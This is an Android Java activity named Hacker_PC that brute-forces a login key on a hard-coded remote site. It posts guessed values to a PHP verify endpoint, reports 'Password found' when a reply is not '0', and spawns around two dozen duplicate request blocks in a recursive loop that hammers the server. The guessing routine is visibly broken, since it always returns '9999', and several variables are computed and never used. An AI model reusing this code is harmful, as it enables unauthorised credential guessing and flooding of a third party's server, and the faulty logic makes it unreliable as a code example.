package jjmomanyi.extremedev.ems;

import android.app.ProgressDialog;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import org.w3c.dom.Text;

import java.util.HashMap;
import java.util.Random;
import java.util.StringTokenizer;

public class Hacker_PC extends AppCompatActivity {
    String url="http://koowa.co.uk/ab/actions/verify.php";
    EditText trylogin;
    String try33;
    Button trier;
    String triedpasswords;

    String tried;
    TextView tt;
    TextView tries;
    TextView moron;
    int i=0;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_hacker__pc);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        trylogin=(EditText)findViewById(R.id.editText10);
        trier=(Button)findViewById(R.id.button5);
        moron=(TextView)findViewById(R.id.textView42) ;
        tried="";
        tt=(TextView)findViewById(R.id.textView41);
        tries=(TextView)findViewById(R.id.textView43) ;


        trier.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                String heymyou=getSaltString();
                 String output = heymyou.substring(0, 1).toUpperCase() + heymyou.substring(1);
               // String output="H"+heymyou;
               // Toast.makeText(Hacker_PC.this, output, Toast.LENGTH_SHORT).show();
                loginnow(output);
              //  String finall=tried+output+"\n";
               // tt.append(finall);

            }
        });



    }
    public void loginnow (final String username)

    {

        class AddEmployee extends AsyncTask<Void,Void,String> {
            ProgressDialog progressDialog;
            @Override
            protected void onPreExecute() {
                super.onPreExecute();

                progressDialog = new ProgressDialog(Hacker_PC.this);
                progressDialog.setMessage("Bruteforcing...");
              //  progressDialog.show();

            }

            @Override
            protected String doInBackground(Void... v) {
                HashMap<String,String> params = new HashMap<>();
                params.put("key",username);
                RequestHandler rh = new RequestHandler();
                String res = rh.sendPostRequest(url, params);
                return res;


            }

            @Override
            protected void onPostExecute(final String string) {
                super.onPostExecute(string);

              //  progressDialog.dismiss();

                if (string.equals("0"))
                {
                   /* i=i+1;
                    String iii=Integer.toString(i);
                    tries.setText(iii);
*/
                    looper();



                }
                else
                {

                    if(string.startsWith("java"))
                    {
                        Toast.makeText(Hacker_PC.this, "Network Error!!!!!!", Toast.LENGTH_SHORT).show();
                    }
                    else
                    {

                        moron.append("Response:" + string);
                        moron.append("Password found: "+ username);
                        Toast.makeText(Hacker_PC.this, "pass found:\n"+username , Toast.LENGTH_SHORT).show();

                    }
                }

            }


        }
        AddEmployee ae = new AddEmployee();
        ae.execute();


    }


    protected String getSaltString()
    {
        //abcdefghijklmnopqrstuvwxyz
        String SALTCHARS = "abcdefghijklmnopqrstuvwxyz";
        StringBuilder salt = new StringBuilder();
        Random rnd = new Random();
        while (salt.length() < 6) {
            int index = (int) (rnd.nextFloat() * SALTCHARS.length());
            salt.append(SALTCHARS.charAt(index));
        }
        String saltStr="";//= salt.toString();

        for (int i=1000; i<=9999;i++)
        {
            saltStr=Integer.toString(i);
        }




        return saltStr;

    }

    public void looper()
    {


        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
                String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
               // String output="H"+sasa;
                loginnow(output);
                String tokem =tried+output+"\n";
              triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
              //  String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
                String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                 triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
                String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(output);
                String tokem =tried+output+"\n";
                 triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
              //  String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
               // String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                 triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
               // String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
               triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
               // String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                 triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
               // String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
                //String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                 triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
               // String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                 triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
              //  String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                 triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
              //  String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                 triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
              //  String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                 triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
               // String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                 triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
               // String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                 triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
              //  String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                 triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
                //String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                 triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
               // String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                 triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
               // String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                 triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
               // String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                 triedpasswords="\n"+tokem;




            }
        });

        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);



                String sasa=getSaltString();
              //  String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                 triedpasswords="\n"+tokem;




            }
        });
        runOnUiThread(new Runnable() {
            @Override
            public void run() {

                i=i+1;
                String iii=Integer.toString(i);
                tries.setText(iii);


                String sasa=getSaltString();
                String output = sasa.substring(0, 1).toUpperCase() + sasa.substring(1);
                // String output="H"+sasa;
                loginnow(sasa);
                String tokem =tried+sasa+"\n";
                 triedpasswords="\n"+tokem;




            }
        });

        tt.setText(triedpasswords);


    }


}
